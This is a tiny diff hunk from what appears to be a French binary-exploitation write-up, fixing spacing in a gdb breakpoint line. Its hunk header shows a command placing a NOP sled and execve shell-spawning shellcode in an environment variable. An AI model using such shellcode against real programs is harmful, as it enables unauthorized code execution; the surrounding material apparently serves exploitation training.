@@ -99,7 +99,7 @@ env -i SC=$(python -c "print('\x90' * 20  + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x7
 - Se qui est dans l'environnement et dans les arguments est supprimé
 
 <pre>
-(gdb)  b *0x08048887
+(gdb) b *0x08048887
 Breakpoint 1 at 0x8048887
 (gdb) b *0x80486cb
 Breakpoint 2 at 0x80486cb
